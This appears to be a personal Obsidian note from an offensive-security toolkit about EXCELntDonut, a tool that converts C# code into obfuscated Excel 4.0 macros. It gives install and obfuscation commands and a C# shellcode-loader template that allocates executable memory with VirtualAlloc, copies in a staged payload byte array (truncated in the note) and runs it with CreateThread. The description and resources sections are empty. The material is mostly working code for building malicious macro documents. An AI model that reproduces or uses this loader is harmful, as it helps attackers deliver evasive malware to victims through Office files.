burp---
creation date: January 18th 2022
last modified date: January 18th 2022
aliases: []
tags: #🧰
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #🧰  

# [[ExcelNTDonut]]  
___

## Description:


## Installation
```bash 
git clone https://github.com/FortyNorthSecurity/EXCELntDonut.git
cd EXCELntDonut
sudo ./install.sh 
```

## Commands

```bash
EXCELntDonut -f excelnt-https.cs --obfuscate -o excelnt-https-obfuscate.txt
```

![[HexDump#Bin to C]]

Get payload byte size
```bash
du -b *.bin
```

## Template 

```csharp 
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Registration
{

	public class RegistrationAssembly
	{
		public static void Main(string[] key)
		{
			
			// Staged payload
            byte[] buf = new byte[943] { 0xfc, 0x48, 0xa9, ... };
			IntPtr funcAddr = VirtualAlloc(
                              IntPtr.Zero,
                              (ulong)buf.Length,
                              (uint)StateEnum.MEM_COMMIT, 
                              (uint)Protection.PAGE_EXECUTE_READWRITE);
            Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);

            IntPtr hThread = IntPtr.Zero;
            uint threadId = 0;
            IntPtr pinfo = IntPtr.Zero;

            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }


        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr,
            ulong size, 
            uint flAllocationType, 
            uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(
            uint lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            uint dwCreationFlags,
            ref uint lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

        public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000
        }

        public enum Protection
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }
		

		
	}
}
```

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: January 18th 2022 (01:31 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
